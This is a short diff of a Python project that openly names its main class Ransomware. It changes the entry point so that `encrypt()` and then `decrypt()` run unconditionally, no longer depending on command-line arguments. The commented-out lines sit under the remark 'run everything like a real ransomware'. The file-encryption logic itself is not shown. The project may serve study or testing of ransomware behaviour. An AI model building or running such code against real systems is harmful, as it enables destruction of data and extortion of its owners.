@@ -104,11 +104,13 @@ class Ransomware:
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG)
-    if len(sys.argv) < 2:
-        ransomware = Ransomware()
-        ransomware.encrypt()
-    elif sys.argv[1] == "--decrypt":
-        ransomware = Ransomware()
-        ransomware.decrypt()
+    
+    # run everything like a real ransomware
+    # if len(sys.argv) < 2:
+    ransomware = Ransomware()
+    ransomware.encrypt()
+    # elif sys.argv[1] == "--decrypt":
+    ransomware = Ransomware()
+    ransomware.decrypt()
 
 
